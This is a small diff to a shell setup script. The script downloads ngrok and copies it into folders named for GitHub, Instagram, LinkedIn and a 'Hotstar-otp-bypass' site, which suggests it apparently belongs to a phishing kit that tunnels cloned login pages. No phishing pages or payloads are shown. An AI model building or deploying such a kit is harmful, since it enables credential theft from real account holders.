@@ -6,7 +6,7 @@ echo ""
 echo ""
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
 unzip ngrok-stable-linux-amd64.zip
-cp -R ngrok github/
+cp -R ngrok sites/github/
 cp -R ngrok sites/Hotstar-otp-bypass/
 cp -R ngrok sites/instagram/
 cp -R ngrok sites/Linkedin/
